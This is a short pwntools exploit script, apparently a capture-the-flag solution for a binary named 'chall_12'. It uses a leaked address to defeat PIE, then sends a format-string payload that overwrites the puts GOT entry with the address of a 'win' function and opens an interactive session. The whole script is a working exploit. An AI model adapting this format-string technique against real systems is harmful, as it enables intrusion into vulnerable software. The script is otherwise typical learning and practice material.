from pwn import *

p = process('./chall_12')

p.recvuntil(b'help: ')
leak = int(p.recvline().decode('utf-8').strip(), 16)

context.arch = 'i386'
binary = ELF(p.elf.path)
binary.address = leak - p.elf.sym['main']

putsaddr = binary.got['puts']
winaddr = binary.sym['win']

payload = fmtstr_payload(6, { putsaddr: winaddr }, write_size="byte")

p.sendline(payload)
p.interactive()
